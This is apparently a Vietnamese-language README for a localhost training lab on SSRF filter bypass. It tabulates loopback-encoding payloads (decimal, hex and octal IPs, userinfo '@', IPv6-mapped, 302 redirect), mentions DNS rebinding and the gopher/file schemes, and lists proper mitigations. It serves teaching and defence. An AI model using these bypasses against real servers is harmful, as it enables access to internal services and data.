# Lab 6.2 - Vuot filter SSRF

Giong 6.1 nhung app co "filter" chong SSRF. Tiec la filter chi chan theo
chuoi ky tu (blocklist mot vai cach viet noi bo), khong chuan hoa dia chi.
Doi cach bieu dien IP, dung "@", hoac redirect 302 la vuot.

## Thanh phan

| File | Vai tro |
|---|---|
| `app.py` | App chinh co filter ngay tho + redirector `/bounce`, bind `127.0.0.1:8057` |
| `internal_service.py` | Dich vu noi bo can cham toi, bind `127.0.0.1:8058` |
| `exploit.py` | Thu loat ky thuat vuot filter |
| `transcript.txt` | Output that cua lan chay |

## Cach chay

```bash
python3 internal_service.py    # terminal 1: 8058
python3 app.py                 # terminal 2: 8057
python3 exploit.py             # terminal 3
```

## Vi sao vuot duoc

Filter chi lam `if "127.0.0.1" in url or "localhost" in url ...`. Nhung
`127.0.0.1` con vo so cach viet khac ma khi resolve van ra loopback:

| Ky thuat | Vi du | Vi sao qua |
|---|---|---|
| Thap phan | `http://2130706433:8058/` | 2130706433 = 0x7f000001 = 127.0.0.1 |
| Hex | `http://0x7f000001:8058/` | khong chua chuoi bi chan |
| Octal | `http://0177.0.0.1:8058/` | 0177 = 127 |
| Rut gon | `http://127.1:8058/` | 127.1 = 127.0.0.1 |
| Host "0" | `http://0:8058/` | 0 = 0.0.0.0 -> loopback |
| Userinfo @ | `http://allowed@2130706433:8058/` | phan truoc @ chi la user, host that la sau @ |
| IPv6-mapped | `http://[::ffff:7f00:1]:8058/` | IPv6 anh xa IPv4 loopback |
| Redirect 302 | `/bounce` -> `Location: http://127.0.0.1:8058/...` | filter chi kiem URL ban dau |

Them (khong chay trong lab nay, xem phan ly thuyet trong bai):
- DNS rebinding: ten mien luc dau resolve ra IP public (qua filter), sau do
  doi sang 127.0.0.1 khi server goi that (TOCTOU - time of check vs time of use).
- Scheme khac: `file://`, `gopher://`, `dict://` de doc file hoac goi dich vu
  khac (requests khong ho tro gopher/file; thu nghiem bang curl/urllib).

## Cach va

- Khong blocklist theo chuoi. Hay resolve hostname -> IP roi kiem IP dich co
  nam trong dai noi bo/link-local khong (deny by default, whitelist domain).
- Kiem LAI sau moi redirect (hoac tat allow_redirects, tu xu ly tung hop).
- Chong DNS rebinding: resolve mot lan roi ket noi dung IP do (pin), hoac
  kiem lai IP ngay truoc khi mo socket.
- Chi cho scheme http/https.
